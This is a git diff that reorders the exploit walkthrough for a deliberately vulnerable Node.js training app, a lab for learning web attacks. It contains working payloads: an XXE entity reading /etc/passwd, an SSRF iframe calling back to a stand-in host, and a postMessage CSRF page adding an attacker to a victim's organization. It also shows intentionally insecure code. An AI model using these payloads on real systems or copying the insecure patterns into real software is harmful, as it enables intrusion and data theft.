@@ -30,54 +30,55 @@
   - [Exploit](#exploit-5)
   - [Vulnerable Code](#vulnerable-code-5)
 - [8. XXE](#8-xxe)
-  - [Solution](#solution)
-- [9. SSRF via PDF generator](#9-ssrf-via-pdf-generator)
-    - [Vulnerable Code](#vulnerable-code-6)
   - [Exploit](#exploit-6)
-- [10. Event Listener XSS](#10-event-listener-xss)
-  - [Vulnerable Code](#vulnerable-code-7)
+  - [Vulnerable code:](#vulnerable-code-6)
+- [9. SSRF via PDF generator](#9-ssrf-via-pdf-generator)
   - [Exploit](#exploit-7)
-- [11. Web Message CSRF](#11-web-message-csrf)
-  - [Vulnearble Code](#vulnearble-code)
+    - [Vulnerable Code](#vulnerable-code-7)
+- [10. Event Listener XSS](#10-event-listener-xss)
   - [Exploit](#exploit-8)
-- [12 Web Message Information Disclosure](#12-web-message-information-disclosure)
-  - [Vulnerable code:](#vulnerable-code-8)
+  - [Vulnerable Code](#vulnerable-code-8)
+- [11. Web Message CSRF](#11-web-message-csrf)
   - [Exploit](#exploit-9)
+  - [Vulnearble Code](#vulnearble-code)
+- [12 Web Message Information Disclosure](#12-web-message-information-disclosure)
+  - [Exploit](#exploit-10)
+  - [Vulnerable code:](#vulnerable-code-9)
 - [13 CORS Information Disclosure](#13-cors-information-disclosure)
-- [Exploit:](#exploit-10)
-  - [Vulnerable Code](#vulnerable-code-9)
-- [14 CORS CSRF](#14-cors-csrf)
-  - [Exploit:](#exploit-11)
+- [Exploit:](#exploit-11)
   - [Vulnerable Code](#vulnerable-code-10)
-- [15 Insecure 2FA implementation.](#15-insecure-2fa-implementation)
+- [14 CORS CSRF](#14-cors-csrf)
   - [Exploit:](#exploit-12)
-- [16. Cross-Site WebSocket Hijacking](#16-cross-site-websocket-hijacking)
-  - [Exploit](#exploit-13)
   - [Vulnerable Code](#vulnerable-code-11)
-- [17 WebSocket XSS](#17-websocket-xss)
+- [15 Insecure 2FA implementation.](#15-insecure-2fa-implementation)
+  - [Exploit:](#exploit-13)
+- [16. Cross-Site WebSocket Hijacking](#16-cross-site-websocket-hijacking)
   - [Exploit](#exploit-14)
-  - [Vulnerable code](#vulnerable-code-12)
-- [18 ReactJS XSS](#18-reactjs-xss)
+  - [Vulnerable Code](#vulnerable-code-12)
+- [17 WebSocket XSS](#17-websocket-xss)
   - [Exploit](#exploit-15)
-  - [Vulnerable Code](#vulnerable-code-13)
-- [19. React ref-innerHTML XSS](#19-react-ref-innerhtml-xss)
+  - [Vulnerable code](#vulnerable-code-13)
+- [18 ReactJS XSS](#18-reactjs-xss)
   - [Exploit](#exploit-16)
-- [Vulnerable code](#vulnerable-code-14)
-- [20. NoSQL Injection](#20-nosql-injection)
+  - [Vulnerable Code](#vulnerable-code-14)
+- [19. React ref-innerHTML XSS](#19-react-ref-innerhtml-xss)
   - [Exploit](#exploit-17)
-  - [Vulnerable code](#vulnerable-code-15)
-- [21. GraphQL Information Disclosure](#21-graphql-information-disclosure)
+- [Vulnerable code](#vulnerable-code-15)
+- [20. NoSQL Injection](#20-nosql-injection)
   - [Exploit](#exploit-18)
-  - [Vulnerable Code](#vulnerable-code-16)
-- [22. GraphQL SQLi](#22-graphql-sqli)
+  - [Vulnerable code](#vulnerable-code-16)
+- [21. GraphQL Information Disclosure](#21-graphql-information-disclosure)
   - [Exploit](#exploit-19)
-  - [Vulnerable code:](#vulnerable-code-17)
-- [23. GraphQL CSRF](#23-graphql-csrf)
+  - [Vulnerable Code](#vulnerable-code-17)
+- [22. GraphQL SQLi](#22-graphql-sqli)
   - [Exploit](#exploit-20)
+  - [Vulnerable code:](#vulnerable-code-18)
+- [23. GraphQL CSRF](#23-graphql-csrf)
+  - [Exploit](#exploit-21)
   - [Vulnearble code](#vulnearble-code-1)
 - [24. GraphQL IDOR](#24-graphql-idor)
-  - [Exploit](#exploit-21)
-  - [Vulnerable code](#vulnerable-code-18)
+  - [Exploit](#exploit-22)
+  - [Vulnerable code](#vulnerable-code-19)
 
 <div class="page-break"></div>
 
@@ -434,8 +435,10 @@ Application is concatenating user supplied input to SQL query without any valida
 
 ### Exploit
 
-1. Go to `/sqli` and select station from list and click on check while intercepting request using burpsuite.
+1. Go to `/sqli` and select station from list and click on **check** while intercepting request using burpsuite.
 2. Add `'` at the end of URL path you will see the SQL error from here you can proceed to get database details.
+
+<div class="page-break"></div>
 
 ### Vulnerable Code
 
@@ -462,12 +465,25 @@ const sqli_check_train_get = (req, res) => {
 }
 ```
 
+
 ## 8. XXE
 
 Application is using libxmljs to parse xml input but noent flag is set to true which enables external
 entities parsing. your goal is to read `/etc/passwd` file.
 
-**Vulnerable code:**
+### Exploit
+
+* Go to `/xxe` and in the comment section add the following payload to read `/etc/passwd` file.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE asdf [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+<root> <comment>
+    <content>%26xxe;</content>
+</comment></root>
+```
+
+### Vulnerable code:
 
 **Routes: /routes/app.js**
 
@@ -487,21 +503,20 @@ const xxe_comment = (req, res) => {
 }
 ```
 
-### Solution
-
-Use the following payload to read /etc/passwd file
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE asdf [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
-<root> <comment>
-    <content>%26xxe;</content>
-</comment></root>
-```
 
 ## 9. SSRF via PDF generator
 
 Application is using html-pdf-node package to generate ticket pdf which takes HTML page as an input and generates the PDF but application is not sanitizing user input before generating the HTML page an attacker can use it to perform the SSRF.
+
+### Exploit
+
+Inject the following payload in the passenger name field to perform the SSRF, change yourwebsite.com
+to your web server to receive callback to confirm the SSRF.
+
+```
+<iframe src="http://yourwebsite.com/asdf"/>
+```
+
 
 #### Vulnerable Code
 
@@ -528,29 +543,10 @@ const ticket_booking_get = (req, res) => {
 Application is receving ticket details from the user then using it to generate HTML page by using html-pdf-node package function generatePdf that takes url as a input and generates the PDF from the
 received response.
 
-### Exploit
-
-Inject the following payload in the passenger name field to perform the SSRF, change yourwebsite.com
-to your web server to receive callback to confirm the SSRF.
-
-```
-<iframe src="http://yourwebsite.com/asdf"/>
-```
 
 ## 10. Event Listener XSS
 
 User edit page has a `addEventListener()` call that listens for the web message and inserts that message to a `<div>` without verifying the origin from where it received the message. 
-
-### Vulnerable Code
-
-**View: /views/user-edit.ejs**
-
-```js
-window.addEventListener("message", function(event){
-    document.getElementById("displayMessage").removeAttribute('hidden')
-    document.getElementById("displayMessage").innerHTML = event.data;
-})
-```
 
 ### Exploit
 
@@ -569,9 +565,41 @@ Create a HTML page with following code and host it on your server to perform the
 </html>
 ```
 
+### Vulnerable Code
+
+**View: /views/user-edit.ejs**
+
+```js
+window.addEventListener("message", function(event){
+    document.getElementById("displayMessage").removeAttribute('hidden')
+    document.getElementById("displayMessage").innerHTML = event.data;
+})
+```
+
+
 ## 11. Web Message CSRF
 
 Organization Management page has a functionality to add user in the org when org owner clicks on the `Add Users` button it opens a new popup window then the org owner selects a user from the list and clicks on the `Add` button this button posts a message using `postMessage()` to the tab which opened it then the opener tab receives the selected username using `addEventListener()` and sends the HTTP request to add that user in the org. Here opener tab does not verifies the origin from which it received the message which means any origin can send a arbitrary username using `postMessage()` and that username will be added to the organisation.
+
+### Exploit
+
+
+1. First create a organization in victim account.
+2. Create a hacker account.
+3. Save the following code in a HTML file and replace the username with your hacker username and send that to victim user your hacker user will get added to the vicitm organization.
+
+```html
+<html>
+<body>
+<iframe src="http://localhost:9000/organization" id="victimWebsite" width="100%" height="100%"></iframe>
+<script>
+  document.addEventListener('readystatechange', () =>{
+    victimWebsite.contentWindow.postMessage("<hacker_username>", '*')
+  })
+</script>
+</body>
+</html>
+```
 
 ### Vulnearble Code
 
@@ -594,41 +622,9 @@ window.addEventListener('message', function (event) {
   })
 ```
 
-### Exploit
-
-
-1. First create a organization in victim account.
-2. Create a hacker account.
-3. Save the following code in a HTML file and replace the username with your hacker username and send that to victim user your hacker user will get added to the vicitm organization.
-
-```html
-<html>
-<body>
-<iframe src="http://localhost:9000/organization" id="victimWebsite" width="100%" height="100%"></iframe>
-<script>
-  document.addEventListener('readystatechange', () =>{
-    victimWebsite.contentWindow.postMessage("<hacker_username>", '*')
-  })
-</script>
-</body>
-</html>
-```
-
 ## 12 Web Message Information Disclosure
 
 In this exercise you will learn how insecure use of `postMessage` can be used to steal the sensitive information, `api-token` has a button show when you click on it, it will open a new popup window which will fetch the user API token and send it to the opener window using postmessage, Since it sends the message to the opener window without specifically specifing the origin, An attacker domain which opens the `/api-token/show` will be able to receive the API token.
-
-### Vulnerable code:
-
-**View: /views/webmessage-api-token-popup.ejs**
-
-```html
-<script>
-    var token = "<%-apiToken%>";
-    window.opener.postMessage({'token': token}, '*')
-    window.close()
-</script>
-```
 
 ### Exploit
 
@@ -645,6 +641,18 @@ Save the following HTML code in a HTML file, host it on your server and send the
 </script>
 </body>
 </html>
+```
+
+### Vulnerable code:
+
+**View: /views/webmessage-api-token-popup.ejs**
+
+```html
+<script>
+    var token = "<%-apiToken%>";
+    window.opener.postMessage({'token': token}, '*')
+    window.close()
+</script>
 ```
 
 ## 13 CORS Information Disclosure
